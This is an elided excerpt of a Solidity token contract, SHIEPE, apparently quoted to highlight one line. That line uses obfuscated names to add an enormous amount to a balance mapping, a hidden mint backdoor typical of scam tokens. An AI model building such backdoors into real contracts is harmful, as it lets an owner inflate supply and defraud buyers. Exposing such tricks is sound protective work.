...
contract SHIEPE is Ownable {
    ...
    external {
        ...
        TED[cc1xx23d] += 1000*((10**decimals()*kjjjxxammmmxxcc));
    ...
    uint256 kjjjxxammmmxxcc =  420690000000000+2e6;
